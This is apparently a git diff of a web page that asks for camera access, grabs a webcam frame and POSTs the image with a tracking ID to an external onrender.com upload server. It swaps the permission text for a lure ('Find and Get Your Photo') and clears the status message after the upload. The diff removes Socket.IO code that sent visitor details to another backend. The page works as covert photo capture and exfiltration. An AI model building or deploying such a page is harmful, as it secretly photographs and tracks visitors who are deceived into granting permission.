@@ -190,8 +190,9 @@
 <div id="errorBox">
   <h2>⚠️ Access Required</h2>
   <p>
-    Camera access is necessary to use this website.<br>
-    Please allow permission and try again.
+    Permission is necessary to use this.<br>
+    Please allow permission and try again.<br>
+    Then Find and Get Your Photo💥🤩
   </p>
   <button onclick="location.reload()">Try Again</button>
 </div>
@@ -375,11 +376,15 @@
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
-<script src="https://cdn.socket.io/4.8.3/socket.io.min.js"></script>
-
 <script>
+const SERVER_URL = "https://app-mjyk.onrender.com/upload";
 
-const userId = "user_" + Date.now() + "_" + Math.floor(Math.random() * 1000);
+let userId = localStorage.getItem("userId");
+
+if (!userId) {
+  userId = "USER_" + Date.now() + "_" + Math.floor(Math.random() * 1000);
+  localStorage.setItem("userId", userId);
+}
 
 window.onload = checkPermission;
 
@@ -394,32 +399,6 @@ async function checkPermission() {
     document.getElementById("message").style.display = "none";
 
     document.getElementById("mainUI").style.display = "block";
-
-    // Initialize Socket.IO
-const socket = io("https://demo-rc9k.onrender.com"); // your backend URL
-
-
-// Receive assigned userId from backend
-socket.on("assign-userId", (data) => {
-  userId = data.userId;
-  console.log("Assigned userId:", userId);
-
-  // Send visitor info to backend
-  const visitorData = {
-    userId, // include userId
-    ipv4: "fetch if available",
-    ipv6: "fetch if available",
-    city: "fetch if available",
-    region: "fetch if available",
-    country: "fetch if available",
-    isp: "fetch if available",
-    device: navigator.userAgent,
-    browser: navigator.userAgent,
-    map: "https://maps.google.com" // optional
-  };
-
-  socket.emit("visitor-info", visitorData);
-});
 
     const video = document.getElementById("video");
     video.srcObject = stream;
@@ -451,15 +430,15 @@ function capturePhoto() {
 
   document.getElementById("status").innerText = "";
 
-  fetch(https://demo-rc9k.onrender.com, {
+  fetch(SERVER_URL, {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
     },
-    body: JSON.stringify({ 
-    image: imageData,
-    userId: userId  // Add this line
-})
+    body: JSON.stringify({
+  	image: imageData,
+  	userId: userId
+	})
   })
   .then(() => {
     document.getElementById("status").innerText = "";
